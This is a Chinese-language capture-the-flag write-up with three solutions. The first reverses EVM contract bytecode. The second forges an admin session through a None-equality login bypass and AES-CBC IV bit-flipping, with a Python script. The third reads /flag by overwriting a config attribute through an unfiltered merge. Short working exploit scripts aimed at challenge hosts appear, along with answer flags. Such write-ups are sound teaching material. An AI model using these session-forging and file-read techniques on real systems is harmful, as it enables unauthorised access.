# Misc
## Signin
```
合约字节码: 608060405234801561000f575f80fd5b5060043610610034575f3560e01c80635e36bdc614610038578063aab2fcd214610068575b5f80fd5b610052600480360381019061004d91906101a4565b610084565b60405161005f91906101e9565b60405180910390f35b610082600480360381019061007d9190610235565b6100a0565b005b5f602052805f5260405f205f915054906101000a900460ff1681565b8082846100ad91906102b2565b146100ed576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100e49061034d565b60405180910390fd5b60015f803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020015f205f6101000a81548160ff021916908315150217905550505050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101738261014a565b9050919050565b61018381610169565b811461018d575f80fd5b50565b5f8135905061019e8161017a565b92915050565b5f602082840312156101b9576101b8610146565b5b5f6101c684828501610190565b91505092915050565b5f8115159050919050565b6101e3816101cf565b82525050565b5f6020820190506101fc5f8301846101da565b92915050565b5f819050919050565b61021481610202565b811461021e575f80fd5b50565b5f8135905061022f8161020b565b92915050565b5f805f6060848603121561024c5761024b610146565b5b5f61025986828701610221565b935050602061026a86828701610221565b925050604061027b86828701610221565b9150509250925092565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6102bc82610202565b91506102c783610202565b92508282026102d581610202565b915082820484148315176102ec576102eb610285565b5b5092915050565b5f82825260208201905092915050565b7f77726f6e670000000000000000000000000000000000000000000000000000005f82015250565b5f6103376005836102f3565b915061034282610303565b602082019050919050565b5f6020820190508181035f8301526103648161032b565b905091905056fea264697066735822122065ea027d1af02280488313e5fba02dae1169f7b75d02f59ba1a92bd682ba579764736f6c63430008140033

反汇编
[00]	PUSH1	80
[02]	PUSH1	40
[04]	MSTORE	
[05]	CALLVALUE	
[06]	DUP1	
[07]	ISZERO	
[08]	PUSH2	000f
[0b]	JUMPI	
[0c]	PUSH0	
[0d]	DUP1	
[0e]	REVERT	
[0f]	JUMPDEST	
[10]	POP	
[11]	PUSH1	04
[13]	CALLDATASIZE	
[14]	LT	
[15]	PUSH2	0034
[18]	JUMPI	
[19]	PUSH0	
[1a]	CALLDATALOAD	
[1b]	PUSH1	e0
[1d]	SHR	
[1e]	DUP1	
[1f]	PUSH4	5e36bdc6
[24]	EQ	
[25]	PUSH2	0038
[28]	JUMPI	
[29]	DUP1	
[2a]	PUSH4	aab2fcd2
[2f]	EQ	
[30]	PUSH2	0068
[33]	JUMPI	
[34]	JUMPDEST	
[35]	PUSH0	
[36]	DUP1	
[37]	REVERT	
[38]	JUMPDEST	
[39]	PUSH2	0052
[3c]	PUSH1	04
[3e]	DUP1	
[3f]	CALLDATASIZE	
[40]	SUB	
[41]	DUP2	
[42]	ADD	
[43]	SWAP1	
[44]	PUSH2	004d
[47]	SWAP2	
[48]	SWAP1	
[49]	PUSH2	01a4
[4c]	JUMP	
[4d]	JUMPDEST	
[4e]	PUSH2	0084
[51]	JUMP	
[52]	JUMPDEST	
[53]	PUSH1	40
[55]	MLOAD	
[56]	PUSH2	005f
[59]	SWAP2	
[5a]	SWAP1	
[5b]	PUSH2	01e9
[5e]	JUMP	
[5f]	JUMPDEST	
[60]	PUSH1	40
[62]	MLOAD	
[63]	DUP1	
[64]	SWAP2	
[65]	SUB	
[66]	SWAP1	
[67]	RETURN	
[68]	JUMPDEST	
[69]	PUSH2	0082
[6c]	PUSH1	04
[6e]	DUP1	
[6f]	CALLDATASIZE	
[70]	SUB	
[71]	DUP2	
[72]	ADD	
[73]	SWAP1	
[74]	PUSH2	007d
[77]	SWAP2	
[78]	SWAP1	
[79]	PUSH2	0235
[7c]	JUMP	
[7d]	JUMPDEST	
[7e]	PUSH2	00a0
[81]	JUMP	
[82]	JUMPDEST	
[83]	STOP	
[84]	JUMPDEST	
[85]	PUSH0	
[86]	PUSH1	20
[88]	MSTORE	
[89]	DUP1	
[8a]	PUSH0	
[8b]	MSTORE	
[8c]	PUSH1	40
[8e]	PUSH0	
[8f]	KECCAK256	
[90]	PUSH0	
[91]	SWAP2	
[92]	POP	
[93]	SLOAD	
[94]	SWAP1	
[95]	PUSH2	0100
[98]	EXP	
[99]	SWAP1	
[9a]	DIV	
[9b]	PUSH1	ff
[9d]	AND	
[9e]	DUP2	
[9f]	JUMP	
[a0]	JUMPDEST	
[a1]	DUP1	
[a2]	DUP3	
[a3]	DUP5	
[a4]	PUSH2	00ad
[a7]	SWAP2	
[a8]	SWAP1	
[a9]	PUSH2	02b2
[ac]	JUMP	
[ad]	JUMPDEST	
[ae]	EQ	
[af]	PUSH2	00ed
[b2]	JUMPI	
[b3]	PUSH1	40
[b5]	MLOAD	
[b6]	PUSH32	08c379a000000000000000000000000000000000000000000000000000000000
[d7]	DUP2	
[d8]	MSTORE	
[d9]	PUSH1	04
[db]	ADD	
[dc]	PUSH2	00e4
[df]	SWAP1	
[e0]	PUSH2	034d
[e3]	JUMP	
[e4]	JUMPDEST	
[e5]	PUSH1	40
[e7]	MLOAD	
[e8]	DUP1	
[e9]	SWAP2	
[ea]	SUB	
[eb]	SWAP1	
[ec]	REVERT	
[ed]	JUMPDEST	
[ee]	PUSH1	01
[f0]	PUSH0	
[f1]	DUP1	
[f2]	CALLER	
[f3]	PUSH20	ffffffffffffffffffffffffffffffffffffffff
[108]	AND	
[109]	PUSH20	ffffffffffffffffffffffffffffffffffffffff
[11e]	AND	
[11f]	DUP2	
[120]	MSTORE	
[121]	PUSH1	20
[123]	ADD	
[124]	SWAP1	
[125]	DUP2	
[126]	MSTORE	
[127]	PUSH1	20
[129]	ADD	
[12a]	PUSH0	
[12b]	KECCAK256	
[12c]	PUSH0	
[12d]	PUSH2	0100
[130]	EXP	
[131]	DUP2	
[132]	SLOAD	
[133]	DUP2	
[134]	PUSH1	ff
[136]	MUL	
[137]	NOT	
[138]	AND	
[139]	SWAP1	
[13a]	DUP4	
[13b]	ISZERO	
[13c]	ISZERO	
[13d]	MUL	
[13e]	OR	
[13f]	SWAP1	
[140]	SSTORE	
[141]	POP	
[142]	POP	
[143]	POP	
[144]	POP	
[145]	JUMP	
[146]	JUMPDEST	
[147]	PUSH0	
[148]	DUP1	
[149]	REVERT	
[14a]	JUMPDEST	
[14b]	PUSH0	
[14c]	PUSH20	ffffffffffffffffffffffffffffffffffffffff
[161]	DUP3	
[162]	AND	
[163]	SWAP1	
[164]	POP	
[165]	SWAP2	
[166]	SWAP1	
[167]	POP	
[168]	JUMP	
[169]	JUMPDEST	
[16a]	PUSH0	
[16b]	PUSH2	0173
[16e]	DUP3	
[16f]	PUSH2	014a
[172]	JUMP	
[173]	JUMPDEST	
[174]	SWAP1	
[175]	POP	
[176]	SWAP2	
[177]	SWAP1	
[178]	POP	
[179]	JUMP	
[17a]	JUMPDEST	
[17b]	PUSH2	0183
[17e]	DUP2	
[17f]	PUSH2	0169
[182]	JUMP	
[183]	JUMPDEST	
[184]	DUP2	
[185]	EQ	
[186]	PUSH2	018d
[189]	JUMPI	
[18a]	PUSH0	
[18b]	DUP1	
[18c]	REVERT	
[18d]	JUMPDEST	
[18e]	POP	
[18f]	JUMP	
[190]	JUMPDEST	
[191]	PUSH0	
[192]	DUP2	
[193]	CALLDATALOAD	
[194]	SWAP1	
[195]	POP	
[196]	PUSH2	019e
[199]	DUP2	
[19a]	PUSH2	017a
[19d]	JUMP	
[19e]	JUMPDEST	
[19f]	SWAP3	
[1a0]	SWAP2	
[1a1]	POP	
[1a2]	POP	
[1a3]	JUMP	
[1a4]	JUMPDEST	
[1a5]	PUSH0	
[1a6]	PUSH1	20
[1a8]	DUP3	
[1a9]	DUP5	
[1aa]	SUB	
[1ab]	SLT	
[1ac]	ISZERO	
[1ad]	PUSH2	01b9
[1b0]	JUMPI	
[1b1]	PUSH2	01b8
[1b4]	PUSH2	0146
[1b7]	JUMP	
[1b8]	JUMPDEST	
[1b9]	JUMPDEST	
[1ba]	PUSH0	
[1bb]	PUSH2	01c6
[1be]	DUP5	
[1bf]	DUP3	
[1c0]	DUP6	
[1c1]	ADD	
[1c2]	PUSH2	0190
[1c5]	JUMP	
[1c6]	JUMPDEST	
[1c7]	SWAP2	
[1c8]	POP	
[1c9]	POP	
[1ca]	SWAP3	
[1cb]	SWAP2	
[1cc]	POP	
[1cd]	POP	
[1ce]	JUMP	
[1cf]	JUMPDEST	
[1d0]	PUSH0	
[1d1]	DUP2	
[1d2]	ISZERO	
[1d3]	ISZERO	
[1d4]	SWAP1	
[1d5]	POP	
[1d6]	SWAP2	
[1d7]	SWAP1	
[1d8]	POP	
[1d9]	JUMP	
[1da]	JUMPDEST	
[1db]	PUSH2	01e3
[1de]	DUP2	
[1df]	PUSH2	01cf
[1e2]	JUMP	
[1e3]	JUMPDEST	
[1e4]	DUP3	
[1e5]	MSTORE	
[1e6]	POP	
[1e7]	POP	
[1e8]	JUMP	
[1e9]	JUMPDEST	
[1ea]	PUSH0	
[1eb]	PUSH1	20
[1ed]	DUP3	
[1ee]	ADD	
[1ef]	SWAP1	
[1f0]	POP	
[1f1]	PUSH2	01fc
[1f4]	PUSH0	
[1f5]	DUP4	
[1f6]	ADD	
[1f7]	DUP5	
[1f8]	PUSH2	01da
[1fb]	JUMP	
[1fc]	JUMPDEST	
[1fd]	SWAP3	
[1fe]	SWAP2	
[1ff]	POP	
[200]	POP	
[201]	JUMP	
[202]	JUMPDEST	
[203]	PUSH0	
[204]	DUP2	
[205]	SWAP1	
[206]	POP	
[207]	SWAP2	
[208]	SWAP1	
[209]	POP	
[20a]	JUMP	
[20b]	JUMPDEST	
[20c]	PUSH2	0214
[20f]	DUP2	
[210]	PUSH2	0202
[213]	JUMP	
[214]	JUMPDEST	
[215]	DUP2	
[216]	EQ	
[217]	PUSH2	021e
[21a]	JUMPI	
[21b]	PUSH0	
[21c]	DUP1	
[21d]	REVERT	
[21e]	JUMPDEST	
[21f]	POP	
[220]	JUMP	
[221]	JUMPDEST	
[222]	PUSH0	
[223]	DUP2	
[224]	CALLDATALOAD	
[225]	SWAP1	
[226]	POP	
[227]	PUSH2	022f
[22a]	DUP2	
[22b]	PUSH2	020b
[22e]	JUMP	
[22f]	JUMPDEST	
[230]	SWAP3	
[231]	SWAP2	
[232]	POP	
[233]	POP	
[234]	JUMP	
[235]	JUMPDEST	
[236]	PUSH0	
[237]	DUP1	
[238]	PUSH0	
[239]	PUSH1	60
[23b]	DUP5	
[23c]	DUP7	
[23d]	SUB	
[23e]	SLT	
[23f]	ISZERO	
[240]	PUSH2	024c
[243]	JUMPI	
[244]	PUSH2	024b
[247]	PUSH2	0146
[24a]	JUMP	
[24b]	JUMPDEST	
[24c]	JUMPDEST	
[24d]	PUSH0	
[24e]	PUSH2	0259
[251]	DUP7	
[252]	DUP3	
[253]	DUP8	
[254]	ADD	
[255]	PUSH2	0221
[258]	JUMP	
[259]	JUMPDEST	
[25a]	SWAP4	
[25b]	POP	
[25c]	POP	
[25d]	PUSH1	20
[25f]	PUSH2	026a
[262]	DUP7	
[263]	DUP3	
[264]	DUP8	
[265]	ADD	
[266]	PUSH2	0221
[269]	JUMP	
[26a]	JUMPDEST	
[26b]	SWAP3	
[26c]	POP	
[26d]	POP	
[26e]	PUSH1	40
[270]	PUSH2	027b
[273]	DUP7	
[274]	DUP3	
[275]	DUP8	
[276]	ADD	
[277]	PUSH2	0221
[27a]	JUMP	
[27b]	JUMPDEST	
[27c]	SWAP2	
[27d]	POP	
[27e]	POP	
[27f]	SWAP3	
[280]	POP	
[281]	SWAP3	
[282]	POP	
[283]	SWAP3	
[284]	JUMP	
[285]	JUMPDEST	
[286]	PUSH32	4e487b7100000000000000000000000000000000000000000000000000000000
[2a7]	PUSH0	
[2a8]	MSTORE	
[2a9]	PUSH1	11
[2ab]	PUSH1	04
[2ad]	MSTORE	
[2ae]	PUSH1	24
[2b0]	PUSH0	
[2b1]	REVERT	
[2b2]	JUMPDEST	
[2b3]	PUSH0	
[2b4]	PUSH2	02bc
[2b7]	DUP3	
[2b8]	PUSH2	0202
[2bb]	JUMP	
[2bc]	JUMPDEST	
[2bd]	SWAP2	
[2be]	POP	
[2bf]	PUSH2	02c7
[2c2]	DUP4	
[2c3]	PUSH2	0202
[2c6]	JUMP	
[2c7]	JUMPDEST	
[2c8]	SWAP3	
[2c9]	POP	
[2ca]	DUP3	
[2cb]	DUP3	
[2cc]	MUL	
[2cd]	PUSH2	02d5
[2d0]	DUP2	
[2d1]	PUSH2	0202
[2d4]	JUMP	
[2d5]	JUMPDEST	
[2d6]	SWAP2	
[2d7]	POP	
[2d8]	DUP3	
[2d9]	DUP3	
[2da]	DIV	
[2db]	DUP5	
[2dc]	EQ	
[2dd]	DUP4	
[2de]	ISZERO	
[2df]	OR	
[2e0]	PUSH2	02ec
[2e3]	JUMPI	
[2e4]	PUSH2	02eb
[2e7]	PUSH2	0285
[2ea]	JUMP	
[2eb]	JUMPDEST	
[2ec]	JUMPDEST	
[2ed]	POP	
[2ee]	SWAP3	
[2ef]	SWAP2	
[2f0]	POP	
[2f1]	POP	
[2f2]	JUMP	
[2f3]	JUMPDEST	
[2f4]	PUSH0	
[2f5]	DUP3	
[2f6]	DUP3	
[2f7]	MSTORE	
[2f8]	PUSH1	20
[2fa]	DUP3	
[2fb]	ADD	
[2fc]	SWAP1	
[2fd]	POP	
[2fe]	SWAP3	
[2ff]	SWAP2	
[300]	POP	
[301]	POP	
[302]	JUMP	
[303]	JUMPDEST	
[304]	PUSH32	77726f6e67000000000000000000000000000000000000000000000000000000
[325]	PUSH0	
[326]	DUP3	
[327]	ADD	
[328]	MSTORE	
[329]	POP	
[32a]	JUMP	
[32b]	JUMPDEST	
[32c]	PUSH0	
[32d]	PUSH2	0337
[330]	PUSH1	05
[332]	DUP4	
[333]	PUSH2	02f3
[336]	JUMP	
[337]	JUMPDEST	
[338]	SWAP2	
[339]	POP	
[33a]	PUSH2	0342
[33d]	DUP3	
[33e]	PUSH2	0303
[341]	JUMP	
[342]	JUMPDEST	
[343]	PUSH1	20
[345]	DUP3	
[346]	ADD	
[347]	SWAP1	
[348]	POP	
[349]	SWAP2	
[34a]	SWAP1	
[34b]	POP	
[34c]	JUMP	
[34d]	JUMPDEST	
[34e]	PUSH0	
[34f]	PUSH1	20
[351]	DUP3	
[352]	ADD	
[353]	SWAP1	
[354]	POP	
[355]	DUP2	
[356]	DUP2	
[357]	SUB	
[358]	PUSH0	
[359]	DUP4	
[35a]	ADD	
[35b]	MSTORE	
[35c]	PUSH2	0364
[35f]	DUP2	
[360]	PUSH2	032b
[363]	JUMP	
[364]	JUMPDEST	
[365]	SWAP1	
[366]	POP	
[367]	SWAP2	
[368]	SWAP1	
[369]	POP	
[36a]	JUMP	
[36b]	INVALID	
[36c]	LOG2	
[36d]	PUSH5	6970667358
[373]	INVALID	
[374]	SLT	
[375]	KECCAK256	
[376]	PUSH6	ea027d1af022
[37d]	DUP1	
[37e]	BASEFEE	
[37f]	DUP4	
[380]	SGT	
[381]	INVALID	
[382]	INVALID	
[383]	LOG0	
[384]	INVALID	
[385]	INVALID	
[386]	GT	
[387]	PUSH10	f7b75d02f59ba1a92bd6
[392]	DUP3	
[393]	INVALID	
[394]	JUMPI	
[395]	SWAP8	
[396]	PUSH5	736f6c6343
[39c]	STOP	
[39d]	ADDMOD	
[39e]	EQ	
[39f]	STOP	
[3a0]	CALLER	

在线网站翻译结果如上
```

```
[1f]	PUSH4	5e36bdc6    <-- 门 A 的名字 (isSolved)
[24]	EQ	
[25]	PUSH2	0038
[28]	JUMPI	            <-- 如果你调用的是门 A，跳到 0038 执行
[29]	DUP1	
[2a]	PUSH4	aab2fcd2    <-- 门 B 的名字 (通关函数)
[2f]	EQ[30]	PUSH2	0068
[33]	JUMPI	            <-- 如果你调用的是门 B，跳到 0068 执行
```

我们追踪 aab2fcd2 跳转到的 0068，它最终会引导到解析参数的 0235 位置。看这里：

codeText

```
[239]	PUSH1	60          <-- 16进制的 60，等于十进制的 96！
[23b]	DUP5	
[23c]	DUP7	
[23d]	SUB	                <-- 计算你传进来的数据长度
[23e]	SLT	                <-- 检查长度是不是小于 96
[23f]	ISZERO	
[240]	PUSH2	024c
[243]	JUMPI               <-- 如果满足条件（>=96），才继续执行
[244]	PUSH2	024b[247]	PUSH2	0146
[24a]	JUMP                <-- 否则跳到 0146，而 0146 是一条 REVERT指令！
```

**真相 1**：在以太坊中，一个参数占 32 字节。这里强制要求你传入 96 字节，说明**这个函数必须接收 3 个参数！** 这就是为什么之前你不传参数，或者随便传个参数，直接被 revert 的原因。


当凑齐了 3 个参数后，代码往下走，进入了校验环节。注意看 02cc 和 00ae 两个关键点：

```
[2cc]	MUL	                <-- 这是一个极其关键的指令：乘法 (Multiply)！它把栈上的两个参数乘起来了 (b * c)。
```

乘完之后，代码回到了主逻辑 00ad 附近：


```
[ad]	JUMPDEST	
[ae]	EQ	                <-- EQ！(Equal) 它把前面乘法的结果，和你传入的第一个参数 (a) 进行了对比！
[af]	PUSH2	00ed
[b2]	JUMPI	            <-- 如果相等 (a == b * c)，跳转到 00ed 去给你发奖！
```

如果**不相等**呢？代码不跳转，继续往下走，遇到了：

codeText

```
[304]	PUSH32	77726f6e67000000000000000000000000000000000000000000000000000000
```

77726f6e67 对应的 ASCII 码正好是字母 **"wrong"**！然后程序 REVERT

xmctf{ec0dabba-dda0-42e7-b7aa-31059a7597e2}


# Crypto
## ez_login
这道题是一道结合了逻辑漏洞与加密机制缺陷的综合性 Web 渗透挑战。

破解思路主要分为两个阶段：第一阶段是利用 Flask 框架后端逻辑的不严谨实现“免密登录”，获取一个合法的初始身份 Session；第二阶段是利用 AES-CBC 加密模式的字节翻转（Bit Flipping）特性，在不篡改密文内容的前提下，通过修改初始向量（IV）篡改解密后的明文，从而将普通用户身份伪造成管理员。

在 `/login` 路由中，代码使用 `USERS.get(user) == pw` 来验证登录。由于 `USERS` 字典中只有 `admin` 键，当提交一个不存在的用户名（如 `bdmin`）时，`USERS.get` 返回 `None`；同时，如果请求中不包含 `password` 字段，`request.form.get('password')` 同样返回 `None`。根据 Python 的相等性判断，`None == None` 为 `True`，导致逻辑验证被绕过，服务器成功下发了一个以 `user=bdmin` 为内容的合法 Session。

由于该 Session 使用 AES-CBC 模式加密，其解密原理为：明文第一块 $P_1 = D_K(C_1) \oplus IV$。这意味着如果我们已知当前明文 $P_1$（即 `user=bdmin`）和当前的 IV，就可以通过构造一个特定的异或值，将 IV 修改为 $IV'$，从而使得解密后的明文 $P'_1$ 变为我们想要的 `user=admin`。由于 `bdmin` 与 `admin` 长度相同，我们只需将 IV 中对应字母 `b` 的位置进行异或操作，即可完成身份篡改，且不会破坏 PKCS7 填充格式。

以下是实现上述攻击的核心 Python 代码：

```python
import requests
import re

# 1. 利用逻辑漏洞获取初始合法 session
login_data = {"username": "bdmin"}
resp = requests.post("http://nc1.ctfplus.cn:33345/login", data=login_data, allow_redirects=False)
token_hex = resp.cookies.get('session')

# 2. 执行 CBC 字节翻转攻击 (Bit Flipping)
data = bytearray.fromhex(token_hex)
iv = data[:16]
ct = data[16:]

# 原明文为 "user=bdmin"，目标为 "user=admin"
# 'b' 位于字符串索引 5 处，将其异或改为 'a'
iv[5] = iv[5] ^ ord('b') ^ ord('a')
new_token_hex = (bytes(iv) + ct).hex()

# 3. 携带伪造的 session 访问后台获取 flag
final_resp = requests.get("http://nc1.ctfplus.cn:33345/", cookies={'session': new_token_hex})
flag = re.search(r'XMCTF\{.*?\}', final_resp.text).group(0)
print(flag)
```


# Web
通过分析题目 Flask 源码，发现`merge`函数未做任何属性过滤，可通过 POST 请求传入 JSON 数据递归修改`Polaris`实例的`config.filename`属性，存在任意文件读取漏洞；构造 POST 请求向根路由提交`{"config":{"filename":"/flag"}}`的 JSON 数据篡改目标读取路径，随后访问`/read`路由，即可直接读取`/flag`文件获取 flag。
```
import requests

TARGET_URL = "http://5000-36c639b8-f71a-4891-b241-ea27992a3349.challenge.ctfplus.cn/"

s = requests.Session()
s.post(TARGET_URL, json={"config": {"filename": "/flag"}})
flag = s.get(f"{TARGET_URL}/read").text
print(flag)
```